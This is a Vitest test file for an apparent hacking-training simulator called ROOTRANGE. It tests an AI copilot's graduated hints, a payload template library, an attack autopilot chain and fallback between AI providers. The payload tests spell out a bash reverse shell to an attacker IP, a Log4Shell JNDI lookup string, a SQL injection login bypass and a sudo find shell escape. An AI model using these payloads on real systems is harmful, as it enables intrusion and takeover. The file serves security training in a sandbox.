import { describe, it, expect, beforeEach, vi } from 'vitest';
import { GhostOpsService } from '../services/ghostOpsService';
import { OfflineDeterministicProvider } from '../services/ai/ghostOpsProviders';
import { ExternalAiAdapterProvider } from '../services/ai/externalAiProvider';
import { OFFENSIVE_PAYLOAD_TEMPLATES } from '../services/ai/payloadTemplates';
import { AUTOPILOT_CHAINS } from '../services/ai/autopilotService';
import { useGameStore } from '../store/gameStore';
import { SimulationEngine } from '../simulation/simulationEngine';

describe('ROOTRANGE Phase 9: GhostOps AI Copilot, Socratic Mentor & Autopilot', () => {
  beforeEach(() => {
    const engine = SimulationEngine.getInstance();
    engine.resetRange();
    useGameStore.getState().resetGame();
    GhostOpsService.getInstance().setProvider({ type: 'offline' });
  });

  describe('1. Socratic Mentor Mode & Graduated Hints', () => {
    it('generates Level 1 general direction grounded in target state', async () => {
      const ghostOps = GhostOpsService.getInstance();
      const hint = await ghostOps.getHint('ecorp-hr', 1);

      expect(hint.level).toBe(1);
      expect(hint.machineId).toBe('ecorp-hr');
      expect(hint.machineName).toBe('E-Corp HR Portal');
      expect(hint.currentPhase).toBe('RECON');
      expect(hint.content).toContain('10.10.11.45');
    });

    it('generates Level 2 relevant service & vulnerability category', async () => {
      const ghostOps = GhostOpsService.getInstance();
      const hint = await ghostOps.getHint('ecorp-hr', 2);

      expect(hint.level).toBe(2);
      expect(hint.content).toContain('port 80');
      expect(hint.content).toContain('Log4j');
    });

    it('generates Level 3 specific evidence inspection', async () => {
      const ghostOps = GhostOpsService.getInstance();
      const hint = await ghostOps.getHint('ecorp-hr', 3);

      expect(hint.level).toBe(3);
      expect(hint.content).toContain('Log4jAuditLogger.java');
      expect(hint.content).toContain('2.14.1');
    });

    it('generates Level 4 explicit next step explanation', async () => {
      const ghostOps = GhostOpsService.getInstance();
      const hint = await ghostOps.getHint('ecorp-hr', 4);

      expect(hint.level).toBe(4);
      expect(hint.content).toContain('/api/audit');
      expect(hint.content).toContain('User-Agent');
    });

    it('generates Level 5 full walkthrough with explicit command action', async () => {
      const ghostOps = GhostOpsService.getInstance();
      const hint = await ghostOps.getHint('ecorp-hr', 5);

      expect(hint.level).toBe(5);
      expect(hint.content).toContain('${jndi:ldap:');
      expect(hint.suggestedAction).toBeDefined();
      expect(hint.suggestedAction).toContain('/api/audit');
    });

    it('dynamically adapts hints when machine compromise level changes to USER (Privesc)', async () => {
      useGameStore.getState().updateCompromiseLevel('ecorp-hr', 'USER');

      const ghostOps = GhostOpsService.getInstance();
      const hint = await ghostOps.getHint('ecorp-hr', 3);

      expect(hint.currentPhase).toBe('PRIVESC');
      expect(hint.content).toContain('sudo -l');
    });

    it('dynamically adapts hints when machine compromise level changes to ROOT', async () => {
      useGameStore.getState().updateCompromiseLevel('ecorp-hr', 'ROOT');

      const ghostOps = GhostOpsService.getInstance();
      const hint = await ghostOps.getHint('ecorp-hr', 1);

      expect(hint.currentPhase).toBe('ROOTED');
      expect(hint.content).toContain('already fully rooted');
    });
  });

  describe('2. Payload Forge & Safety Boundaries', () => {
    it('provides configurable parameter replacement without automatic execution', () => {
      const bashTpl = OFFENSIVE_PAYLOAD_TEMPLATES.find((t) => t.id === 'bash-tcp-revshell');
      expect(bashTpl).toBeDefined();

      const rendered = bashTpl?.template({
        lhost: '10.10.14.99',
        lport: '9001',
        shell: 'bash',
      });

      expect(rendered).toBe('bash -i >& /dev/tcp/10.10.14.99/9001 0>&1');
      expect(bashTpl?.safetyNotes).toContain('Do not use against unauthorized networks');
    });

    it('renders Log4Shell JNDI injection templates safely', () => {
      const log4jTpl = OFFENSIVE_PAYLOAD_TEMPLATES.find((t) => t.id === 'log4j-jndi-string');
      const rendered = log4jTpl?.template({
        ldapHost: '10.10.14.50',
        ldapPort: '1389',
        className: 'RcePayload',
      });

      expect(rendered).toBe('${jndi:ldap://10.10.14.50:1389/RcePayload}');
    });

    it('renders SQLi and GTFOBins sudo find templates', () => {
      const sqliTpl = OFFENSIVE_PAYLOAD_TEMPLATES.find((t) => t.id === 'sqli-auth-bypass-json');
      expect(sqliTpl?.template({ user: 'finance_admin', operator: '1=1', comment: '--' })).toBe(
        "finance_admin' OR 1=1--"
      );

      const privescTpl = OFFENSIVE_PAYLOAD_TEMPLATES.find((t) => t.id === 'gtfobins-sudo-find');
      expect(privescTpl?.template({ path: '/tmp', shell: '/bin/sh' })).toBe(
        'sudo /usr/bin/find /tmp -exec /bin/sh \\; -quit'
      );
    });
  });

  describe('3. Adversary Autopilot Simulation', () => {
    it('defines valid multi-phase autopilot chains for training targets', () => {
      const ecorpChain = AUTOPILOT_CHAINS['ecorp-hr'];
      expect(ecorpChain.length).toBe(7);
      expect(ecorpChain[0].phase).toBe('RECON');
      expect(ecorpChain[3].phase).toBe('EXPLOITATION');
      expect(ecorpChain[4].phase).toBe('FLAG_CAPTURE');
      expect(ecorpChain[5].phase).toBe('PRIVESC');
      expect(ecorpChain[6].phase).toBe('FLAG_CAPTURE');
    });

    it('executes steps sequentially using real simulation engine without fabricated state', () => {
      const ghostOps = GhostOpsService.getInstance();
      const ecorpChain = ghostOps.getAutopilotSteps('ecorp-hr');

      // Step 1: Recon
      const res1 = ghostOps.executeAutopilotStep(ecorpChain[0]);
      expect(res1.success).toBe(true);
      expect(res1.output).toContain('Apache/2.4.49');

      // Step 4: Exploitation (sets compromise to USER)
      const res4 = ghostOps.executeAutopilotStep(ecorpChain[3]);
      expect(res4.success).toBe(true);
      expect(useGameStore.getState().machines.find((m) => m.id === 'ecorp-hr')?.compromiseLevel).toBe('USER');

      // Step 5: User Flag Capture
      const res5 = ghostOps.executeAutopilotStep(ecorpChain[4]);
      expect(res5.success).toBe(true);
      expect(res5.flagCaptured).toBe('ROOTRANGE{u53r_l0g4j_f00th0ld_pwn3d}');
      expect(useGameStore.getState().claimedFlags).toContain('ROOTRANGE{u53r_l0g4j_f00th0ld_pwn3d}');
    });

    it('enforces network reachability constraints: isolated targets fail gracefully', () => {
      const ghostOps = GhostOpsService.getInstance();
      // Ensure ecorp is reset so internal network is isolated
      useGameStore.getState().resetMachine('ecorp-hr');

      const ironChain = ghostOps.getAutopilotSteps('iron-vault');
      const res = ghostOps.executeAutopilotStep(ironChain[0]);

      // Since ecorp-hr is not compromised, 10.10.11.82 is isolated behind pivot router
      expect(res.success).toBe(false);
      expect(res.output).toContain('[Network Boundary]');
    });
  });

  describe('4. Provider Abstraction & Failure Handling', () => {
    it('operates reliably offline without external network or API keys', async () => {
      const offlineProvider = new OfflineDeterministicProvider();
      const res = await offlineProvider.queryAssistant('How do I exploit Log4j?');

      expect(res.success).toBe(true);
      expect(res.provider).toBe('offline');
      expect(res.text).toContain('Offline Socratic Engine');
    });

    it('handles missing API keys gracefully by falling back to offline provider', async () => {
      const externalProvider = new ExternalAiAdapterProvider({
        type: 'openai',
        apiKey: '', // missing
      });

      const store = useGameStore.getState();
      const ecorp = store.machines[0];

      const hint = await externalProvider.generateHint(
        {
          machine: ecorp,
          evidence: [],
          portsDiscovered: [80, 8080],
          routesDiscovered: ['/api/audit'],
          compromiseLevel: 'NONE',
          userClaimed: false,
          rootClaimed: false,
        },
        1
      );

      // Successfully returned baseline without throwing unhandled exceptions
      expect(hint.level).toBe(1);
      expect(hint.content).toContain('10.10.11.45');
    });

    it('handles network or service failures in external provider gracefully', async () => {
      const fetchSpy = vi.spyOn(globalThis, 'fetch').mockRejectedValueOnce(new Error('Connection refused'));

      const externalProvider = new ExternalAiAdapterProvider({
        type: 'ollama',
        baseUrl: 'http://localhost:11434',
      });

      const res = await externalProvider.queryAssistant('test query');
      expect(res.success).toBe(false);
      expect(res.error).toContain('Connection refused');

      fetchSpy.mockRestore();
    });
  });
});
